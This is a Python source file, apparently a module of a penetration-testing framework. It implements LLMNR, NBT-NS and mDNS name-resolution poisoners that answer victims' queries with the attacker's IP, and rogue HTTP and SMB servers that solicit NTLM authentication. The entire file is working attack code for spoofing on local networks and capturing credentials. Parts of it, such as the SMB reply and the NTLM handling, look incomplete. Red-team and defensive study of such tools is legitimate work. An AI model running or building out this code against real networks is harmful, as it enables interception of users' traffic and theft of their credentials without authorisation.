import socket
import threading
import logging
import struct
import dns.resolver
from socketserver import ThreadingMixIn, UDPServer, TCPServer, BaseRequestHandler
from src.utils.db_handler import DatabaseHandler
from src.modules.storage.models import Plugin, Resultat

class ResponderCapture:
    def __init__(self, interface="0.0.0.0", 
                 poisoning_ports={'llmnr': 5355, 'nbt-ns': 137, 'mdns': 5353},
                 auth_ports={'http': 80, 'smb': 445}):
        self.interface = interface
        self.poisoning_ports = poisoning_ports
        self.auth_ports = auth_ports
        self.running = False
        self.servers = []
        self.db_handler = DatabaseHandler()
        self.logger = logging.getLogger(__name__)
        
    def start_poisoning(self):
        """Start all poisoning and authentication servers"""
        try:
            # Start poisoning servers
            llmnr_server = LLMNRPoisoner((self.interface, self.poisoning_ports['llmnr']), self)
            llmnr_thread = threading.Thread(target=llmnr_server.serve_forever)
            llmnr_thread.daemon = True
            llmnr_thread.start()
            self.servers.append(llmnr_server)
            
            nbtns_server = NBTNSPoisoner((self.interface, self.poisoning_ports['nbt-ns']), self)
            nbtns_thread = threading.Thread(target=nbtns_server.serve_forever)
            nbtns_thread.daemon = True
            nbtns_thread.start()
            self.servers.append(nbtns_server)
            
            mdns_server = MDNSPoisoner((self.interface, self.poisoning_ports['mdns']), self)
            mdns_thread = threading.Thread(target=mdns_server.serve_forever)
            mdns_thread.daemon = True
            mdns_thread.start()
            self.servers.append(mdns_server)
            
            # Start HTTP server for capturing auth
            http_server = HTTPServer((self.interface, self.auth_ports['http']), self)
            http_thread = threading.Thread(target=http_server.serve_forever)
            http_thread.daemon = True
            http_thread.start()
            self.servers.append(http_server)
            
            # Start SMB server for capturing auth
            smb_server = SMBServer((self.interface, self.auth_ports['smb']), self)
            smb_thread = threading.Thread(target=smb_server.serve_forever)
            smb_thread.daemon = True
            smb_thread.start()
            self.servers.append(smb_server)
            
            self.running = True
            self.logger.info(f"All servers started on {self.interface}")
            
        except Exception as e:
            self.logger.error(f"Error starting servers: {e}")
            self.stop_poisoning()

    def stop_poisoning(self):
        """Stop all poisoning servers"""
        self.running = False
        for server in self.servers:
            server.shutdown()
            server.server_close()
        self.servers = []
        self.logger.info("All poisoning servers stopped")

    def handle_poisoned_request(self, request_type, source_ip, request_name):
        """Handle poisoned requests and store them"""
        try:
            self.logger.info(f"Received {request_type} request from {source_ip} for name {request_name}")
            capture_info = {
                'nom_plugin': f'{request_type} Poison',
                'description': f'Poisoned {request_type} request from {source_ip} for name {request_name}',
                'version': '1.0',
                'source_ip': source_ip,
                'request_name': request_name
            }
            plugin_id = self.db_handler.store_plugin(**capture_info)
            
            if plugin_id:
                result_data = {
                    'id_plugin': plugin_id,
                    'status': 'SUCCESS',
                    'details': f'{request_type} request poisoned successfully'
                }
                self.db_handler.store_result(**result_data)
                
        except Exception as e:
            self.logger.error(f"Error handling poisoned request: {e}")

    def get_response_ip(self):
        """Get the IP address to use in poisoned responses"""
        try:
            if self.interface == "0.0.0.0":
                # Get the first non-loopback IPv4 address
                s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
                s.connect(("8.8.8.8", 80))
                ip = s.getsockname()[0]
                s.close()
                return ip
            return self.interface
        except:
            return self.interface

class LLMNRPoisoner(ThreadingMixIn, UDPServer):
    def __init__(self, server_address, responder):
        self.responder = responder
        UDPServer.__init__(self, server_address, LLMNRRequestHandler)
        
class NBTNSPoisoner(ThreadingMixIn, UDPServer):
    def __init__(self, server_address, responder):
        self.responder = responder
        UDPServer.__init__(self, server_address, NBTNSRequestHandler)
        
class MDNSPoisoner(ThreadingMixIn, UDPServer):
    def __init__(self, server_address, responder):
        self.responder = responder
        UDPServer.__init__(self, server_address, MDNSRequestHandler)

class HTTPServer(ThreadingMixIn, TCPServer):
    def __init__(self, server_address, responder):
        self.responder = responder
        TCPServer.__init__(self, server_address, HTTPRequestHandler)
        
class SMBServer(ThreadingMixIn, TCPServer):
    def __init__(self, server_address, responder):
        self.responder = responder
        TCPServer.__init__(self, server_address, SMBRequestHandler)

class LLMNRRequestHandler(BaseRequestHandler):
    def handle(self):
        """Handle LLMNR query and send poisoned response"""
        try:
            data, sock = self.request
            
            if data[2:4] == b'\x00\x00':  # Query packet
                # Get query details
                name_length = struct.unpack('!B', data[12:13])[0]
                query_name = data[13:13 + name_length].decode('utf-8')
                
                # Log the request
                self.server.responder.handle_poisoned_request('LLMNR', self.client_address[0], query_name)
                
                # Create response
                response = (
                    data[:2] +  # Transaction ID
                    b'\x80\x00' +  # Flags (response + authoritative)
                    b'\x00\x01' +  # Questions
                    b'\x00\x01' +  # Answer RRs
                    b'\x00\x00' +  # Authority RRs
                    b'\x00\x00' +  # Additional RRs
                    data[12:13+name_length+1] +  # Original query
                    b'\x00\x01' +  # Type (A)
                    b'\x00\x01' +  # Class (IN)
                    b'\x00\x00\x00\x1e' +  # TTL (30 seconds)
                    b'\x00\x04' +  # Data length
                    socket.inet_aton(self.server.responder.get_response_ip())  # Our IP
                )
                
                # Send response
                sock.sendto(response, self.client_address)
                
        except Exception as e:
            self.server.responder.logger.error(f"Error in LLMNR handler: {e}")
            
class NBTNSRequestHandler(BaseRequestHandler):
    def handle(self):
        """Handle NBT-NS query and send poisoned response"""
        try:
            data, sock = self.request
            
            if data[2:4] == b'\x01\x10':  # Name query packet
                # Get query details
                query_name = data[13:45].decode('ascii').strip()
                
                # Log the request
                self.server.responder.handle_poisoned_request('NBT-NS', self.client_address[0], query_name)
                
                # Create response
                response = (
                    data[:2] +  # Transaction ID
                    b'\x85\x00' +  # Flags (response + authoritative)
                    b'\x00\x00' +  # Questions
                    b'\x00\x01' +  # Answer RRs
                    b'\x00\x00' +  # Authority RRs
                    b'\x00\x00' +  # Additional RRs
                    data[12:45] +  # Original query
                    b'\x00\x20' +  # Type (NB)
                    b'\x00\x01' +  # Class (IN)
                    b'\x00\x00\x00\x1e' +  # TTL (30 seconds)
                    b'\x00\x04' +  # Data length
                    socket.inet_aton(self.server.responder.get_response_ip())  # Our IP
                )
                
                # Send response
                sock.sendto(response, self.client_address)
                
        except Exception as e:
            self.server.responder.logger.error(f"Error in NBT-NS handler: {e}")
            
class MDNSRequestHandler(BaseRequestHandler):
    def handle(self):
        """Handle MDNS query and send poisoned response"""
        try:
            data, sock = self.request
            
            if data[2:4] == b'\x00\x00':  # Query packet
                # Get query details
                query_name = data[12:].split(b'\x00')[0].decode('utf-8')
                
                # Log the request
                self.server.responder.handle_poisoned_request('MDNS', self.client_address[0], query_name)
                
                # Create response
                response = (
                    data[:2] +  # Transaction ID
                    b'\x84\x00' +  # Flags (response + authoritative)
                    b'\x00\x00' +  # Questions
                    b'\x00\x01' +  # Answer RRs
                    b'\x00\x00' +  # Authority RRs
                    b'\x00\x00' +  # Additional RRs
                    data[12:] +  # Original query
                    b'\x00\x01' +  # Type (A)
                    b'\x00\x01' +  # Class (IN)
                    b'\x00\x00\x00\x1e' +  # TTL (30 seconds)
                    b'\x00\x04' +  # Data length
                    socket.inet_aton(self.server.responder.get_response_ip())  # Our IP
                )
                
                # Send response
                sock.sendto(response, self.client_address)
                
        except Exception as e:
            self.server.responder.logger.error(f"Error in MDNS handler: {e}")

class HTTPRequestHandler(BaseRequestHandler):
    def handle(self):
        """Handle HTTP request and capture NTLM authentication"""
        try:
            data = self.request.recv(4096)
            if b'NTLMSSP' in data:
                self.server.responder.logger.info(f"Received HTTP NTLM auth from {self.client_address[0]}")
                # Send 401 to trigger NTLM auth
                response = (
                    b'HTTP/1.1 401 Unauthorized\r\n'
                    b'WWW-Authenticate: NTLM\r\n'
                    b'Content-Length: 0\r\n'
                    b'Connection: close\r\n\r\n'
                )
                self.request.sendall(response)
                
                # Receive and process NTLM auth
                auth_data = self.request.recv(4096)
                if auth_data and b'NTLMSSP' in auth_data:
                    self.server.responder.handle_poisoned_request(
                        'HTTP', self.client_address[0], 'HTTP NTLM Auth')
        except Exception as e:
            self.server.responder.logger.error(f"Error in HTTP handler: {e}")

class SMBRequestHandler(BaseRequestHandler):
    def handle(self):
        """Handle SMB request and capture NTLM authentication"""
        try:
            data = self.request.recv(4096)
            if b'\xffSMB' in data:  # SMB protocol signature
                self.server.responder.logger.info(f"Received SMB connection from {self.client_address[0]}")
                # Send SMB negotiate response
                response = (
                    b'\x00\x00\x00\x85'  # NetBIOS
                    b'\xffSMB'  # SMB signature
                    b'\x72'  # Negotiate Protocol
                    b'\x00\x00\x00\x00'  # Status: SUCCESS
                    b'\x18\x53\xc0'  # Flags
                    b'\x00\x00'  # Process ID High
                    b'\x00\x00\x00\x00\x00\x00\x00\x00'  # Signature
                    b'\x00\x00'  # Reserved
                    b'\x00\x00'  # Tree ID
                    b'\xff\xfe'  # Process ID
                    b'\x00\x00'  # User ID
                    b'\x00\x00'  # Multiplex ID
                )
                self.request.sendall(response)
                
                # Receive and process NTLM auth
                auth_data = self.request.recv(4096)
                if auth_data and b'NTLMSSP' in auth_data:
                    self.server.responder.handle_poisoned_request(
                        'SMB', self.client_address[0], 'SMB NTLM Auth')
        except Exception as e:
            self.server.responder.logger.error(f"Error in SMB handler: {e}")